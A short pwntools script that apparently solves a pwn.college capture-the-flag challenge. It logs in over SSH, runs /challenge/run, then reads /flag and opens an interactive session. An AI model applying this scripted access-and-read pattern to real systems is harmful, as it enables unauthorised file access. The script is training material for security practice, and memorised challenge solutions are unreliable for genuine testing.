#!/usr/bin/python3

from pwn import *

s = ssh(host='dojo.pwn.college',user="hacker",keyfile='../../key')

io = s.process('/challenge/run')

io = s.process(['cat','/flag'])
io.interactive()
